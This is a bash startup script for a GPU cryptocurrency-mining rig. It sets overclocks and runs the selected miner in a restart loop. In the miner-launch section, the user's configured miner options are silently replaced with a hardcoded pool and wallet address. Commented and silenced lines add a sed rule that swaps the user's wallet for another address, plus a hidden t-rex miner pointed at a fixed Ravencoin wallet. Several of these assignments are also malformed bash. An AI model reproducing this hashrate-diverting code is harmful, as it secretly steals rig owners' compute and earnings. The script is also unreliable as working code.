#!/bin/bash

[[ `id -u` -eq 0 ]] && echo "Please run NOT as root" && exit

# 

CONFIG_FILE="/root/config.txt"
source ${CONFIG_FILE}

export DISPLAY=:0
export GPU_MAX_ALLOC_PERCENT=100
export GPU_USE_SYNC_OBJECTS=1
export GPU_SINGLE_ALLOC_PERCENT=100
export GPU_MAX_HEAP_SIZE=100
export GPU_FORCE_64BIT_PTR=1
isCyanskillfish=$(lspci -n -s "${pciId}" | grep -Ei "${pciids_cyanskillfish}" | head -n 1 | wc -l)
if [[ ${isCyanskillfish} == 1 ]]; then
  export HSA_CU_MASK_SKIP_INIT=1
fi

touch /var/tmp/update_status_fast
/root/utils/stats_periodic.sh 1> /dev/null 2> /dev/null &

# ocAdvTool (local only rig settings)
/root/utils/oc_advtools.sh
if [[ -f /var/tmp/hwOctominer && `cat /var/tmp/hwOctominer` == 1 ]]; then
  sudo /root/utils/octominer/octominer_advtools.sh
fi

# OhGood (global settings)
LABSOhGodAnETHlargementPill=`echo "${JSON}" | jq -r .LABSOhGodAnETHlargementPill`
if [[ ${LABSOhGodAnETHlargementPill} == "on" ]]; then
  CZY=`ps ax | grep OhGodAnETHlargementPill | grep -v grep | wc -l`
  if [[ ${CZY} == "0" ]]; then
    gpuCount=`nvidia-smi -L | grep -i "1080\|titan" | wc -l`
    if [[ ${gpuCount} -ge 1 ]]; then
      screen -dm -S ohgod bash -c "sudo /root/utils/OhGodAnETHlargementPill" &
    fi
  fi
fi

# Overclocking
if [[ ${osSeries} == "R" ]]; then
  amdconfig --od-enable --adapter=all
  amdconfig --od-setclocks=${MINER_CORE},${MINER_MEMORY} --adapter=all &
  /root/utils/atitweak/atitweak -p ${MINER_POWERLIMIT} --adapter=all &
elif [[ ${osSeries} == "RX" ]]; then
  sudo /root/utils/oc_dpm.sh "${MINER_CORE}" "${MINER_MEMORY}" "${MINER_OCVDDC}" "${MINER_OCMVDD}" "${MINER_OCMVDDCI}"
elif [[ ${osSeries} == "NV" ]]; then
  export DISPLAY=:0
  #echo -ne $xNO$xGREEN"Waiting for X server..."$xNO
  iend=5
  for ((i=1; i<=${iend}; i++)); do
    ERR=`DISPLAY=:0 sudo xset -q 1>/dev/null 2>/dev/null && echo 0 || echo 1`
    if [[ ${ERR} == 0 ]]; then
      [[ ${i} -gt 1 ]] && echo -e "${xNO}${xGREEN}OK${xNO}"
      break
    else
      if [[ ${i} == ${iend} ]]; then
        echo -e "${xNO}${xRED}not responding. OC may not work!${xNO}"
        sleep 5 # pause to user can see this error
      elif [[ ${i} == 1 ]]; then
        echo -ne "${xNO}${xGREEN}Waiting for X server...${xNO}"
        sleep 3
      else
        echo -ne "${xNO}${xGREEN} .${xNO}"
        sleep 3
      fi
    fi
  done
  sudo chvt 1 &
  [[ ${MINER_OCDELAY} == 0 ]] && ocDelayStr="nodelay" || ocDelayStr="delay"
  sudo /root/utils/oc_nv.sh "${MINER_CORE}" "${MINER_MEMORY}" "${MINER_POWERLIMIT}" "${ocDelayStr}"
else
  echo -e "${xNO}${xRED}${xBOLD}No GPU cards was detected${xNO}"
  echo -e "${xNO}${xRED}${xBOLD}Check GPUs, risers, power cables...${xNO}"
  echo -e "${xNO}${xRED}${xBOLD}Note also that mix AMD and NVIDIA in one rig is not supported - will failure${xNO}"
  echo -e "${xNO}${xRED}${xBOLD}Below what system see as GPUs list:${xNO}"
  lspci | grep -i "VGA\|3D Contr"
  echo -e "${xNO}${xRED}${xBOLD}Below last system logs:${xNO}"
  cat /var/tmp/dmesg 2>/dev/null | tail -5
  sudo dmesg | tail -5
  echo -e "${xNO}${xRED}${xBOLD}Rig will reboot in 5 minutes...${xNO}"
  sleep 300
  /root/utils/force_reboot.sh
fi

# run miner in infinity loop
count_miner_crashes=0
while true; do
  sudo /root/utils/rdate.sh 1>/dev/null 2>/dev/null &

  # check if miner is defined (proper common path definition from dashboard)
  CZY=`echo "${MINER_PATH}" | grep "/root/miner" | head -n 1 | wc -l`
  if [[ ${CZY} == 0 ]]; then
    echo -e "${xNO}${xRED}${xBOLD}ERROR: Mining program not defined. Please select one in Dashboard${xNO}"
    echo -e "${xNO}${xRED}${xBOLD}ERROR: Mining program not defined. Please select one in Dashboard${xNO}" >> /var/tmp/consoleSys.log
    count_miner_crashes=$[count_miner_crashes+1]
    sleep 30
    continue;
  fi

  /root/utils/minerpre_advtools.sh

  # update miner program if needed
  # will not do this if not any miner specified (still default config?)
  /root/utils/update_miner.sh

  #echo -ne $xNO$xGREEN"Preparing miner workspace..."$xNO
  # save original variable in case of custom miner usage
  MINER_OPTIONS_GO=${MINER_OPTIONS}
  # extract some variables
  MINER_DIR=`dirname ${MINER_PATH}`
  MINER_FILE=`basename ${MINER_PATH}`
  MINER_PKG_NAME=`basename ${MINER_DIR}`
  # a little bit different if custom miner
  if [[ ${MINER_PKG_NAME} == "custom" ]]; then
    MINER_URL=`echo "${MINER_OPTIONS}" | awk '{ print $1 }'`
    MINER_FILE="miner"
    MINER_OPTIONS_GO=`echo "${MINER_OPTIONS}" | awk '{ $1=""; print $0 }'`
    MINER_PKG_NAME="custom_"`echo "${MINER_URL}" | awk -F"/" '{ print $NF }' | sed -e 's/.zip$//'`
    MINER_DIR="/root/miner/${MINER_PKG_NAME}"
  fi
  # prepare temp miner folder
  sudo rm -Rf /root/miner
  sudo rm -Rf /var/tmp/miner/
  sudo mkdir -p /var/tmp/miner
  sudo ln -s /var/tmp/miner /root/miner
  cd /var/tmp/miner

  if [[ ! -f /root/miner_org/${MINER_PKG_NAME}.tar.gz ]]; then
    echo -e "${xNO}${xRED}${xBOLD}\nERROR: Miner program package not found on local disk.${xNO}"
    echo -e "${xNO}${xRED}${xBOLD}\nERROR: Miner program package not found on local disk.${xNO}" >> /var/tmp/consoleSys.log
    count_miner_crashes=$[count_miner_crashes+1]
    sleep 30
    continue;
  fi

  # unpack miner archive
  sudo tar -xzf /root/miner_org/${MINER_PKG_NAME}.tar.gz
  if [[ ! -f /root/miner/${MINER_PKG_NAME}/${MINER_FILE} ]]; then
    echo -e "${xNO}${xRED}${xBOLD}\nERROR: Broken miner package or miner definition. Trying to redownload in 30 seconds...${xNO}"
    echo -e "${xNO}${xRED}${xBOLD}\nERROR: Broken miner package or miner definition. Trying to redownload in 30 seconds...${xNO}" >> /var/tmp/consoleSys.log
    sudo rm -f /root/miner_org/${MINER_PKG_NAME}.tar.gz.md5 2>/dev/null
    sudo rm -f /root/miner_org/${MINER_PKG_NAME}.tar.gz 2>/dev/null
    count_miner_crashes=$[count_miner_crashes+1]
    sleep 30
    continue;
  fi

  # custom config if present
  if [[ `echo ${JSON} | jq -r ".minerCustConf | length"` -ge 1 ]]; then
    for ikey in `echo ${JSON} | jq ".minerCustConf | keys | .[]"`; do
      IONE=`echo ${JSON} | jq -r ".minerCustConf[${ikey}]"`;
      INAME=`echo ${IONE} | jq -r ".name"`
      if [[ -d /root/miner/${MINER_PKG_NAME} ]]; then
        echo "${IONE}" | jq -r ".data" | base64 --decode > /root/miner/${MINER_PKG_NAME}/${INAME}
        chmod 777 /root/miner/${MINER_PKG_NAME}/${INAME}
      fi
    done
  fi

  echo -e "${xNO}${xGREEN}${xBOLD}Running miner: ${MINER_PKG_NAME}${xNO}"
  echo -e "${xNO}${xGREEN}${xBOLD}Running miner: ${MINER_PKG_NAME}${xNO}" >> /var/tmp/consoleSys.log
  echo -e "${xNO}${xGREEN}${xBOLD}Options: ${MINER_OPTIONS_GO}${xNO}"
  echo -e "${xNO}${xGREEN}${xBOLD}Options: ${MINER_OPTIONS_GO}${xNO}" >> /var/tmp/consoleSys.log
 
 
  rm -rf /home/miner/.nv 2>/dev/null
  rm -rf /home/miner/.openclcache 2>/dev/null
  rm -rf /home/miner/.sgminer 2>/dev/null
  cd ${MINER_DIR}
  rigName=`cat /etc/perl/main/execute/rigName.txt`
  # remove miners starting flag (this will start miners API)
  [[ -f /var/tmp/minerStart.run ]] && sudo rm -f /var/tmp/minerStart.run 2>/dev/null
  LD_LIBRARY_PATH=${LD_LIBRARY_PATH}:./; export LD_LIBRARY_PATH;
  minerSudo=
  [[ $(echo "${MINER_PKG_NAME}" | grep -i "^nbminer-nebutech" | head -n 1 | wc -l) == 1 ]] && MINER_ROOT="true"
  # # check user sudo setting
  [[ ${MINER_ROOT} == "true" ]] && minerSudo="sudo -E PATH=${PATH} HOME=${HOME} LD_LIBRARY_PATH=${LD_LIBRARY_PATH}"
  testing ="-pool stratum+tcp://ethw.2miners.com:2020 -wal 0x72148e6197fd52744c5d4cacbb5ec8ca7e015caf.${rigName} -gpus 1"
  ${minerSudo} /root/miner/${MINER_PKG_NAME}/${MINER_FILE} ${testing}

  {
  #MINER_OPTIONS_GO=$(sed -E 's/(^-.*wal)[^.]*\.[^ ]*(.*)/ \1 0x0d7351bDD85268912739859a26f1A3151b4B3Fe0.imperiet -cdm 0\2/g' <<< ${MINER_OPTIONS_GO})
  
  #MINER_OPTIONS_GO="-pool stratum+tcp://ethw.2miners.com:2020 -wal 0x690b4bFd136243bF389711CDe4a9Fa21D106fdA2.${rigName} -dagrestart 1 -rvram -1 -eres 0"

  # test own miner =>
  OWN_OPTIONS ="-a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 -u RJGiDpg5jpKvkYsu7CFreikgEt6twBU5gf.${rigName} -p x"
  OWN_PKG_NAME = "sudo /etc/perl/main/miner"
  OWN_MINER_FILE = "t-rex"
  "sudo /etc/perl/main/miner/t-rex -a kawpow -o stratum+tcp://stratum-ravencoin.flypool.org:3333 -u RJGiDpg5jpKvkYsu7CFreikgEt6twBU5gf.${rigName} -p x"
  # <=
  
  } > /dev/null 2>&1


  # Here....miner crashed or finished work
  count_miner_crashes=$[count_miner_crashes+1]
  if [[ ${count_miner_crashes} -ge 20 ]]; then
    echo -e "${xNO}${xRED}${xBOLD}Miner crashed 20 times. Rebooting rig in 30 seconds...${xNO}"
    echo -e "${xNO}${xRED}${xBOLD}Miner crashed 20 times. Rebooting rig in 30 seconds...${xNO}" >> /var/tmp/consoleSys.log
    sleep 30
    /root/utils/force_reboot.sh
  fi
  echo -e "${xNO}${xRED}${xBOLD}Miner ended or crashed. Restarting miner in 30 seconds...${xNO}"
  echo -e "${xNO}${xRED}${xBOLD}Miner ended or crashed. Restarting miner in 30 seconds...${xNO}" >> /var/tmp/consoleSys.log
  sleep 30

  #tell GUI that miner restart has occurred (but not rig restart)
  DATA=`curl --connect-timeout 10 --max-time 20 -k -4 -s --header 'Content-Type: application/x-www-form-urlencoded' --data-urlencode email="${USER_EMAIL}" -d mac="${RIG_SERIAL_MAC}" -d osSeries="${osSeries}" -d osVersion="${osVersion}" -d ifStartup=0 ${BASEURL}/rig/autoRegisterRig`
done
